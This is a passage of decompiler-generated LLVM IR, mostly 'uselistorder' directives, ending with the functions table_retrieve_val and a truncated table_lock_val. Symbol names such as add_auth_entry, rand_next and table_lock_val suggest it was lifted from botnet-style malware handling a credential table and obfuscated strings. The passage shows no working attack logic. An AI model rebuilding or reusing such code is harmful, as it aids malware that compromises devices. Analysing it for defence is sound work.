  uselistorder i32 45, { 0, 1, 3, 2, 4 }
  uselistorder i32 223, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 118, { 2, 0, 1 }
  uselistorder i32 220, { 1, 0 }
  uselistorder i32 211, { 0, 2, 1 }
  uselistorder i32 111, { 2, 3, 0, 1 }
  uselistorder i32 41, { 3, 2, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32 165, { 1, 0, 2 }
  uselistorder i32 251, { 6, 7, 8, 4, 9, 10, 5, 0, 1, 2, 3 }
  uselistorder i32 231, { 2, 0, 1 }
  uselistorder i32 142, { 0, 3, 4, 1, 5, 2, 6 }
  uselistorder i32 139, { 1, 0, 2 }
  uselistorder i32 138, { 1, 2, 0, 3, 4 }
  uselistorder i32 222, { 0, 2, 3, 4, 5, 6, 1, 7 }
  uselistorder i32 221, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 134, { 2, 0, 1, 3 }
  uselistorder i32 39, { 2, 3, 1, 4, 0 }
  uselistorder i32 236, { 1, 2, 0, 3 }
  uselistorder i32 254, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 253, { 5, 6, 4, 0, 1, 2, 3 }
  uselistorder i32 63, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 35, { 1, 0, 2 }
  uselistorder i32 119, { 0, 2, 3, 1 }
  uselistorder i32 234, { 1, 2, 0 }
  uselistorder i32 206, { 0, 4, 1, 2, 5, 3 }
  uselistorder i32 207, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 203, { 2, 0, 1, 3 }
  uselistorder i32 58, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 67, { 1, 0 }
  uselistorder i32 166, { 3, 0, 1, 2 }
  uselistorder i32 163, { 2, 0, 1 }
  uselistorder i32 216, { 1, 2, 0 }
  uselistorder i32 151, { 0, 2, 3, 1 }
  uselistorder i32 190, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 184, { 2, 0, 1, 3 }
  uselistorder i32 183, { 2, 0, 1 }
  uselistorder i32 143, { 1, 2, 3, 0 }
  uselistorder i32 149, { 2, 0, 3, 1 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 158, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 147, { 1, 0, 2 }
  uselistorder i32 153, { 1, 2, 0 }
  uselistorder i32 79, { 3, 0, 1, 2 }
  uselistorder i32 191, { 0, 2, 3, 1 }
  uselistorder i32 167, { 2, 3, 0, 4, 1 }
  uselistorder i32 215, { 2, 0, 1, 3 }
  uselistorder i32 54, { 3, 1, 2, 0 }
  uselistorder i32 214, { 0, 2, 1, 3 }
  uselistorder i32 137, { 1, 2, 0, 3 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 49, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), { 0, 5, 1, 6, 2, 3, 4, 7 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), { 0, 10, 1, 11, 2, 3, 4, 12, 5, 13, 6, 14, 7, 15, 8, 16, 9, 17 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a7b8.173 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1a7b0.169 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), { 0, 7, 1, 2, 3, 8, 4, 9, 5, 10, 6, 11 }
  uselistorder i8* @global_var_23271.160, { 1, 0 }
  uselistorder i16* @global_var_23266.159, { 2, 1, 0 }
  uselistorder i32 5888, { 2, 3, 0, 4, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 0, 14, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 ptrtoint (i8** @global_var_23250.151 to i32), { 1, 0, 3, 2, 4, 7, 6, 5 }
  uselistorder i8* @global_var_23270.155, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 3, 2, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 9, 8, 7, 6, 5, 0, 4, 3, 1, 2 }
  uselistorder i32* @global_var_25d68.149, { 1, 2, 3, 4, 0 }
  uselistorder i32* @global_var_25d64.147, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_23280.135, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_25d48.57, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_25d48.57 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1061c.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1061c.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %bb1974, { 1, 0 }
  uselistorder label %dec_label_pc_1118c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_110a8, { 1, 0 }
  uselistorder label %dec_label_pc_10f98, { 0, 1, 2, 5, 3, 6, 7, 4 }
  uselistorder label %dec_label_pc_10f60, { 1, 0 }
  uselistorder label %dec_label_pc_10f4c, { 0, 1, 2, 3, 6, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10e88, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10e6c, { 1, 0 }
  uselistorder label %dec_label_pc_10d60, { 1, 0 }
  uselistorder label %dec_label_pc_10cb4, { 1, 0 }
  uselistorder label %thread-pre-split722, { 1, 0 }
  uselistorder label %dec_label_pc_10c64, { 1, 0 }
  uselistorder label %.thread1199, { 5, 2, 3, 1, 4, 6, 0 }
  uselistorder label %dec_label_pc_10be8, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread714, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10bb4, { 1, 0 }
  uselistorder label %.thread710, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b94, { 1, 0 }
  uselistorder label %dec_label_pc_10b80, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10b3c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10ad0, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10ab4, { 1, 0 }
  uselistorder label %dec_label_pc_109fc, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_109e0, { 1, 0 }
  uselistorder label %dec_label_pc_10928, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_1090c, { 1, 0 }
  uselistorder label %dec_label_pc_10854, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10838, { 1, 0 }
  uselistorder label %dec_label_pc_107b0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10720, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb1936, { 1, 0 }
  uselistorder label %bb1934, { 1, 0 }
  uselistorder label %dec_label_pc_106e8, { 1, 0 }
  uselistorder label %dec_label_pc_10680, { 1, 0 }
  uselistorder label %.thread675, { 1, 0 }
  uselistorder label %dec_label_pc_10634, { 1, 0 }
  uselistorder label %dec_label_pc_10624, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10624.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10600, { 1, 0 }
  uselistorder label %bb1930, { 1, 0 }
  uselistorder label %dec_label_pc_10524, { 1, 0 }
  uselistorder label %bb1928, { 1, 0 }
  uselistorder label %bb1926, { 1, 0 }
  uselistorder label %bb1924, { 1, 0 }
  uselistorder label %bb1922, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_10418.dec_label_pc_10418_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_103f4.dec_label_pc_103f4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_103e8, { 4, 0, 1, 2, 3 }
  uselistorder label %bb1920, { 1, 0 }
  uselistorder label %dec_label_pc_103c8, { 1, 0 }
  uselistorder label %dec_label_pc_103a0, { 1, 0 }
  uselistorder label %dec_label_pc_1037c, { 1, 0 }
  uselistorder label %dec_label_pc_10244, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_10230, { 1, 0 }
  uselistorder label %dec_label_pc_10120, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10100, { 1, 0 }
  uselistorder label %dec_label_pc_100ec, { 1, 0 }
  uselistorder label %dec_label_pc_100d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1008c, { 1, 2, 0 }
  uselistorder label %thread-pre-split626, { 1, 0 }
  uselistorder label %bb1900, { 1, 0 }
  uselistorder label %dec_label_pc_10048, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10024, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10000, { 2, 0, 3, 1 }
  uselistorder label %bb1891, { 1, 0 }
  uselistorder label %bb1889, { 1, 0 }
  uselistorder label %dec_label_pc_ffcc, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_ffac, { 1, 2, 0, 3 }
  uselistorder label %bb1886, { 1, 0 }
  uselistorder label %dec_label_pc_ff90, { 1, 0 }
  uselistorder label %thread-pre-split598, { 1, 0 }
  uselistorder label %bb1883, { 1, 0 }
  uselistorder label %thread-pre-split597, { 1, 0 }
  uselistorder label %bb1880, { 1, 0 }
  uselistorder label %thread-pre-split595, { 1, 0 }
  uselistorder label %bb1875, { 1, 0 }
  uselistorder label %thread-pre-split593, { 1, 0 }
  uselistorder label %bb1870, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fec0, { 1, 2, 0 }
  uselistorder label %thread-pre-split586, { 1, 0 }
  uselistorder label %bb1862, { 1, 0 }
  uselistorder label %dec_label_pc_fe7c, { 2, 1, 3, 0 }
  uselistorder label %bb1859, { 1, 0 }
  uselistorder label %bb1857, { 1, 0 }
  uselistorder label %dec_label_pc_fe54, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_fe30, { 2, 0, 3, 1 }
  uselistorder label %bb1852, { 1, 0 }
  uselistorder label %bb1850, { 1, 0 }
  uselistorder label %dec_label_pc_fdfc, { 2, 0, 3, 1 }
  uselistorder label %bb1847, { 1, 0 }
  uselistorder label %bb1845, { 1, 0 }
  uselistorder label %dec_label_pc_fdc8, { 2, 1, 3, 0 }
  uselistorder label %bb1842, { 1, 0 }
  uselistorder label %bb1840, { 1, 0 }
  uselistorder label %dec_label_pc_fda0, { 2, 0, 3, 1 }
  uselistorder label %bb1836, { 1, 0 }
  uselistorder label %bb1834, { 1, 0 }
  uselistorder label %dec_label_pc_fd6c, { 2, 0, 3, 1 }
  uselistorder label %bb1831, { 1, 0 }
  uselistorder label %bb1829, { 1, 0 }
  uselistorder label %dec_label_pc_fd38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fd1c, { 2, 0, 3, 1 }
  uselistorder label %bb1825, { 1, 0 }
  uselistorder label %bb1823, { 1, 0 }
  uselistorder label %dec_label_pc_fce8, { 2, 0, 3, 1 }
  uselistorder label %bb1820, { 1, 0 }
  uselistorder label %bb1818, { 1, 0 }
  uselistorder label %dec_label_pc_fcb4, { 2, 0, 3, 1 }
  uselistorder label %bb1815, { 1, 0 }
  uselistorder label %bb1813, { 1, 0 }
  uselistorder label %dec_label_pc_fc84, { 2, 0, 3, 1 }
  uselistorder label %bb1810, { 1, 0 }
  uselistorder label %bb1808, { 1, 0 }
  uselistorder label %dec_label_pc_fc54, { 1, 2, 0 }
  uselistorder label %bb1806, { 1, 0 }
  uselistorder label %bb1804, { 1, 0 }
  uselistorder label %dec_label_pc_fc2c, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_fc08, { 1, 0, 2 }
  uselistorder label %bb1800, { 1, 0 }
  uselistorder label %bb1798, { 1, 0 }
  uselistorder label %dec_label_pc_fbe0, { 2, 0, 3, 1 }
  uselistorder label %bb1795, { 1, 0 }
  uselistorder label %bb1793, { 1, 0 }
  uselistorder label %dec_label_pc_fbac, { 2, 0, 3, 1 }
  uselistorder label %bb1790, { 1, 0 }
  uselistorder label %bb1788, { 1, 0 }
  uselistorder label %dec_label_pc_fb78, { 1, 2, 0 }
  uselistorder label %bb1786, { 1, 0 }
  uselistorder label %bb1784, { 1, 0 }
  uselistorder label %dec_label_pc_fb4c, { 1, 0 }
  uselistorder label %dec_label_pc_fb40, { 1, 0 }
  uselistorder label %dec_label_pc_fb20, { 1, 0 }
  uselistorder label %dec_label_pc_fb08, { 1, 0 }
  uselistorder label %dec_label_pc_fadc, { 1, 0 }
  uselistorder label %dec_label_pc_fad0, { 1, 0 }
  uselistorder label %dec_label_pc_fab0, { 1, 0 }
  uselistorder label %dec_label_pc_fa78, { 1, 0 }
  uselistorder label %dec_label_pc_fa6c, { 1, 0 }
  uselistorder label %dec_label_pc_fa54, { 1, 0 }
  uselistorder label %dec_label_pc_fa40, { 1, 0 }
  uselistorder label %dec_label_pc_fa28, { 1, 0 }
  uselistorder label %dec_label_pc_fa10, { 1, 0, 2 }
  uselistorder label %bb1773, { 1, 0 }
  uselistorder label %bb1771, { 1, 0 }
  uselistorder label %dec_label_pc_f9dc, { 2, 0, 3, 1 }
  uselistorder label %bb1766, { 1, 0 }
  uselistorder label %bb1764, { 1, 0 }
  uselistorder label %dec_label_pc_f9ac, { 2, 1, 3, 0 }
  uselistorder label %bb1761, { 1, 0 }
  uselistorder label %bb1759, { 1, 0 }
  uselistorder label %dec_label_pc_f978, { 2, 1, 3, 0 }
  uselistorder label %bb1753, { 1, 0 }
  uselistorder label %bb1751, { 1, 0 }
  uselistorder label %dec_label_pc_f950, { 2, 1, 3, 0 }
  uselistorder label %bb1747, { 1, 0 }
  uselistorder label %bb1745, { 1, 0 }
  uselistorder label %dec_label_pc_f928, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_f904, { 2, 0, 3, 1 }
  uselistorder label %bb1740, { 1, 0 }
  uselistorder label %bb1738, { 1, 0 }
  uselistorder label %dec_label_pc_f8d0, { 2, 0, 3, 1 }
  uselistorder label %bb1735, { 1, 0 }
  uselistorder label %bb1733, { 1, 0 }
  uselistorder label %dec_label_pc_f89c, { 1, 0, 2 }
  uselistorder label %bb1730, { 1, 0 }
  uselistorder label %bb1728, { 1, 0 }
  uselistorder label %dec_label_pc_f874, { 1, 0, 2 }
  uselistorder label %bb1725, { 1, 0 }
  uselistorder label %bb1723, { 1, 0 }
  uselistorder label %dec_label_pc_f850, { 1, 0, 2 }
  uselistorder label %bb1720, { 1, 0 }
  uselistorder label %bb1718, { 1, 0 }
  uselistorder label %dec_label_pc_f828, { 2, 0, 3, 1 }
  uselistorder label %bb1715, { 1, 0 }
  uselistorder label %bb1713, { 1, 0 }
  uselistorder label %dec_label_pc_f7f8, { 1, 0 }
  uselistorder label %dec_label_pc_f7e0, { 1, 0 }
  uselistorder label %dec_label_pc_f7c8, { 1, 2, 0 }
  uselistorder label %bb1708, { 1, 0 }
  uselistorder label %bb1706, { 1, 0 }
  uselistorder label %dec_label_pc_f7a0, { 2, 0, 3, 1 }
  uselistorder label %bb1703, { 1, 0 }
  uselistorder label %bb1701, { 1, 0 }
  uselistorder label %bb1699, { 1, 0 }
  uselistorder label %dec_label_pc_f740, { 2, 1, 3, 0 }
  uselistorder label %bb1694, { 1, 0 }
  uselistorder label %bb1692, { 1, 0 }
  uselistorder label %dec_label_pc_f708, { 2, 0, 3, 1 }
  uselistorder label %bb1686, { 1, 0 }
  uselistorder label %dec_label_pc_f6d8, { 1, 2, 0 }
  uselistorder label %bb1684, { 1, 0 }
  uselistorder label %bb1682, { 1, 0 }
  uselistorder label %dec_label_pc_f6ac, { 2, 1, 3, 0 }
  uselistorder label %bb1679, { 1, 0 }
  uselistorder label %bb1677, { 1, 0 }
  uselistorder label %dec_label_pc_f678, { 1, 0, 2 }
  uselistorder label %bb1671, { 1, 0 }
  uselistorder label %bb1669, { 1, 0 }
  uselistorder label %dec_label_pc_f644, { 2, 0, 3, 1 }
  uselistorder label %bb1664, { 1, 0 }
  uselistorder label %bb1662, { 1, 0 }
  uselistorder label %dec_label_pc_f610, { 2, 0, 3, 1 }
  uselistorder label %bb1659, { 1, 0 }
  uselistorder label %dec_label_pc_f5e0, { 1, 2, 0 }
  uselistorder label %bb1657, { 1, 0 }
  uselistorder label %bb1655, { 1, 0 }
  uselistorder label %dec_label_pc_f5b4, { 1, 2, 0 }
  uselistorder label %bb1653, { 1, 0 }
  uselistorder label %bb1651, { 1, 0 }
  uselistorder label %dec_label_pc_f58c, { 2, 1, 3, 0 }
  uselistorder label %bb1648, { 1, 0 }
  uselistorder label %bb1646, { 1, 0 }
  uselistorder label %dec_label_pc_f558, { 2, 1, 3, 0 }
  uselistorder label %bb1640, { 1, 0 }
  uselistorder label %dec_label_pc_f528, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f510, { 2, 0, 3, 1 }
  uselistorder label %bb1633, { 1, 0 }
  uselistorder label %bb1631, { 1, 0 }
  uselistorder label %dec_label_pc_f4dc, { 2, 0, 3, 1 }
  uselistorder label %bb1628, { 1, 0 }
  uselistorder label %bb1626, { 1, 0 }
  uselistorder label %dec_label_pc_f4a8, { 1, 2, 0 }
  uselistorder label %bb1624, { 1, 0 }
  uselistorder label %dec_label_pc_f484, { 2, 1, 3, 0 }
  uselistorder label %bb1621, { 1, 0 }
  uselistorder label %dec_label_pc_f460, { 1, 0, 2 }
  uselistorder label %bb1617, { 1, 0 }
  uselistorder label %bb1615, { 1, 0 }
  uselistorder label %dec_label_pc_f430, { 1, 2, 0 }
  uselistorder label %bb1611, { 1, 0 }
  uselistorder label %bb1609, { 1, 0 }
  uselistorder label %dec_label_pc_f3e8, { 1, 0 }
  uselistorder label %dec_label_pc_f3a8, { 1, 0 }
  uselistorder label %dec_label_pc_f390, { 1, 0 }
  uselistorder label %dec_label_pc_f334, { 1, 0 }
  uselistorder label %dec_label_pc_f31c, { 1, 0 }
  uselistorder label %dec_label_pc_f308, { 1, 0 }
  uselistorder label %dec_label_pc_f2f0, { 1, 0 }
  uselistorder label %thread-pre-split212, { 1, 0 }
  uselistorder label %bb1591, { 1, 0 }
  uselistorder label %dec_label_pc_f290, { 1, 2, 0 }
  uselistorder label %thread-pre-split207, { 1, 0 }
  uselistorder label %bb1588, { 1, 0 }
  uselistorder label %thread-pre-split205, { 1, 0 }
  uselistorder label %bb1583, { 1, 0 }
  uselistorder label %thread-pre-split204, { 1, 0 }
  uselistorder label %bb1580, { 1, 0 }
  uselistorder label %thread-pre-split203, { 1, 0 }
  uselistorder label %bb1577, { 1, 0 }
  uselistorder label %thread-pre-split201, { 1, 0 }
  uselistorder label %bb1572, { 1, 0 }
  uselistorder label %dec_label_pc_f188, { 1, 2, 0 }
  uselistorder label %thread-pre-split195, { 1, 0 }
  uselistorder label %bb1566, { 1, 0 }
  uselistorder label %thread-pre-split193, { 1, 0 }
  uselistorder label %bb1561, { 1, 0 }
  uselistorder label %thread-pre-split191, { 1, 0 }
  uselistorder label %bb1556, { 1, 0 }
  uselistorder label %thread-pre-split190, { 1, 0 }
  uselistorder label %bb1553, { 1, 0 }
  uselistorder label %thread-pre-split189, { 1, 0 }
  uselistorder label %bb1550, { 1, 0 }
  uselistorder label %dec_label_pc_f08c, { 1, 2, 0 }
  uselistorder label %thread-pre-split183, { 1, 0 }
  uselistorder label %bb1544, { 1, 0 }
  uselistorder label %thread-pre-split182, { 1, 0 }
  uselistorder label %bb1541, { 1, 0 }
  uselistorder label %thread-pre-split181, { 1, 0 }
  uselistorder label %bb1538, { 1, 0 }
  uselistorder label %thread-pre-split180, { 1, 0 }
  uselistorder label %bb1535, { 1, 0 }
  uselistorder label %thread-pre-split179, { 1, 0 }
  uselistorder label %bb1532, { 1, 0 }
  uselistorder label %bb1530, { 1, 0 }
  uselistorder label %bb1528, { 1, 0 }
  uselistorder label %thread-pre-split178, { 1, 0 }
  uselistorder label %bb1525, { 1, 0 }
  uselistorder label %dec_label_pc_ef88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef64, { 1, 2, 0 }
  uselistorder label %bb1520, { 1, 0 }
  uselistorder label %bb1518, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 2, 0 }
  uselistorder label %bb1515, { 1, 0 }
  uselistorder label %thread-pre-split167, { 1, 0 }
  uselistorder label %bb1512, { 1, 0 }
  uselistorder label %thread-pre-split165, { 1, 0 }
  uselistorder label %bb1507, { 1, 0 }
  uselistorder label %dec_label_pc_eeb0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee8c, { 1, 2, 0 }
  uselistorder label %bb1500, { 1, 0 }
  uselistorder label %bb1498, { 1, 0 }
  uselistorder label %dec_label_pc_ee64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee48, { 1, 2, 0 }
  uselistorder label %bb1496, { 1, 0 }
  uselistorder label %bb1494, { 1, 0 }
  uselistorder label %dec_label_pc_ee20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_edfc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_edd8, { 1, 2, 0 }
  uselistorder label %bb1486, { 1, 0 }
  uselistorder label %bb1484, { 1, 0 }
  uselistorder label %thread-pre-split132, { 1, 0 }
  uselistorder label %bb1481, { 1, 0 }
  uselistorder label %thread-pre-split131, { 1, 0 }
  uselistorder label %bb1478, { 1, 0 }
  uselistorder label %dec_label_pc_ed34, { 1, 2, 0 }
  uselistorder label %bb1469, { 1, 0 }
  uselistorder label %bb1467, { 1, 0 }
  uselistorder label %bb1465, { 1, 0 }
  uselistorder label %bb1463, { 1, 0 }
  uselistorder label %dec_label_pc_ecd4, { 1, 0 }
  uselistorder label %dec_label_pc_ecb8, { 1, 0 }
  uselistorder label %dec_label_pc_ec9c, { 1, 0 }
  uselistorder label %dec_label_pc_ec84, { 1, 0 }
  uselistorder label %dec_label_pc_ec2c, { 1, 0 }
  uselistorder label %dec_label_pc_ec10, { 1, 0 }
  uselistorder label %dec_label_pc_ebf4, { 1, 0 }
  uselistorder label %dec_label_pc_ebd8, { 1, 0 }
  uselistorder label %dec_label_pc_eb88, { 1, 0 }
  uselistorder label %dec_label_pc_eb6c, { 1, 0 }
  uselistorder label %dec_label_pc_eb60, { 1, 0 }
  uselistorder label %dec_label_pc_eb44, { 1, 0 }
  uselistorder label %dec_label_pc_eb2c, { 1, 0 }
  uselistorder label %dec_label_pc_eb0c, { 1, 0 }
  uselistorder label %dec_label_pc_eac8, { 1, 0 }
  uselistorder label %dec_label_pc_eabc, { 1, 0 }
  uselistorder label %dec_label_pc_ea64, { 1, 0 }
  uselistorder label %dec_label_pc_ea30, { 1, 0 }
  uselistorder label %dec_label_pc_ea1c, { 1, 0 }
  uselistorder label %dec_label_pc_ea08, { 1, 0 }
  uselistorder label %dec_label_pc_e9e0, { 1, 0 }
  uselistorder label %dec_label_pc_e9cc, { 1, 0 }
  uselistorder label %dec_label_pc_e9b8, { 1, 0 }
  uselistorder label %dec_label_pc_e9a0, { 1, 0 }
  uselistorder label %dec_label_pc_e984, { 1, 0 }
  uselistorder label %dec_label_pc_e930, { 1, 0 }
  uselistorder label %dec_label_pc_e918, { 1, 0 }
  uselistorder label %bb1370, { 1, 0 }
  uselistorder label %dec_label_pc_e858, { 11, 117, 0, 12, 118, 119, 13, 120, 121, 14, 122, 123, 124, 125, 15, 126, 16, 17, 127, 128, 18, 129, 19, 130, 131, 132, 20, 133, 21, 22, 23, 24, 25, 134, 26, 27, 28, 29, 30, 135, 31, 32, 33, 34, 136, 35, 36, 137, 37, 38, 138, 39, 40, 41, 42, 43, 139, 44, 45, 46, 47, 48, 49, 50, 51, 52, 140, 53, 54, 55, 56, 57, 58, 59, 141, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 142, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 177, 178, 179, 180, 181, 182, 91, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 92, 198, 199, 200, 93, 201, 202, 203, 204, 94, 205, 95, 96, 206, 207, 208, 97, 98, 99, 209, 210, 211, 100, 101, 102, 212, 103, 213, 104, 105, 106, 159, 107, 108, 109, 110, 111, 112, 113, 160, 161, 162, 114, 115, 116, 163, 164, 165, 166, 1, 167, 2, 168, 3, 169, 4, 170, 5, 171, 6, 172, 7, 173, 8, 174, 9, 175, 10, 176, 214 }
  uselistorder label %dec_label_pc_e5b8, { 1, 2, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_25d74.234 to i32), i32* @r2, align 4
  %v3_1131c = mul i32 %arg1, 8
  %v2_11320 = add i32 %v3_1131c, ptrtoint (i32* @global_var_25d74.234 to i32)
  store i32 %v2_11320, i32* @r3, align 4
  %v2_11324 = icmp eq i32* %arg2, null
  br i1 %v2_11324, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_1132c4 = inttoptr i32 %v2_11320 to i32*
  %v4_1132c5 = load i32, i32* %v3_1132c4, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_11328 = add i32 %v3_1131c, add (i32 ptrtoint (i32* @global_var_25d74.234 to i32), i32 4)
  %v3_11328 = inttoptr i32 %v2_11328 to i16*
  %v4_11328 = load i16, i16* %v3_11328, align 4
  %v5_11328 = zext i16 %v4_11328 to i32
  store i32 %v5_11328, i32* @r3, align 4
  %v3_1132c = inttoptr i32 %v2_11320 to i32*
  %v4_1132c = load i32, i32* %v3_1132c, align 4
  store i32 %v5_11328, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_1132c6 = phi i32 [ %v4_1132c5, %.thread ], [ %v4_1132c, %bb ]
  ret i32 %v4_1132c6

; uselistorder directives
  uselistorder i32 %v2_11320, { 1, 0, 2 }
  uselistorder i32 %v3_1131c, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11344 = mul i32 %arg1, 8
  %v2_11348 = add i32 %v3_11344, ptrtoint (i32* @global_var_25d74.234 to i32)
  %v2_1134c = load i32, i32* @global_var_230c4.237, align 4
  store i32 %v2_1134c, i32* @r1, align 4
  %v1_11350 = add i32 %v3_11344, add (i32 ptrtoint (i32* @global_var_25d74.234 to i32), i32 4)
  %v2_11350 = inttoptr i32 %v1_11350 to i16*
  %v3_11350 = load i16, i16* %v2_11350, align 4
  %v3_11354 = udiv i32 %v2_1134c, 256
  %v2_11358 = icmp eq i16 %v3_11350, 0
  store i1 %v2_11358, i1* @cpsr_z, align 1
  %v3_1135c = udiv i32 %v2_1134c, 65536
  store i32 %v3_1135c, i32* @r3, align 4
  %v3_11360 = load i32, i32* @r4, align 4
  store i32 %v3_11360, i32* %stack_var_-16, align 4
  %v1_11364 = urem i32 %v3_11354, 256
  store i32 %v1_11364, i32* %r6.global-to-local, align 4
  %v1_11368 = urem i32 %v3_1135c, 256
  store i32 %v1_11368, i32* %r5.global-to-local, align 4
  %v3_1136c = udiv i32 %v2_1134c, 16777216
  store i32 %v3_1136c, i32* %r4.global-to-local, align 4
  %v1_11370 = urem i32 %v2_1134c, 256
  store i32 %v1_11370, i32* %lr.global-to-local, align 4
  br i1 %v2_11358, label %dec_label_pc_113cc, label %dec_label_pc_11378

dec_label_pc_11378:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_1137c = inttoptr i32 %v2_11348 to i32*
  br label %dec_label_pc_1137c

